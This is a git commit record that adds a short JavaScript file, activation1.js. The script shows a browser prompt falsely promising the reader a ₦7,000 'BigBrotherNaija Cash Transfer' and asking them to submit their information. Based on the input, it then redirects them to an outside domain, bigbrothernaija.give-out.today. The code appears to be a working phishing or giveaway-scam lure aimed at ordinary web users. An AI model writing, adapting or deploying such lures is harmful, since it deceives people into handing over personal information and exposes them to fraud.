383d00d0fc534d45ecb51b4c4a3eb4c03eba421f
gethelppd <fxmitaco.m@gmail.com>
2025-10-05 14:27:49 +0100

    Create activation1.js

---
+++ activation1.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('BBN: Congratulations, you are eligible to receive the â‚¦7,000 BigBrotherNaija Cash Transfer, Kindly press OK to submit your information and receive â‚¦7,000 now ','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://bigbrothernaija.give-out.today';
+}
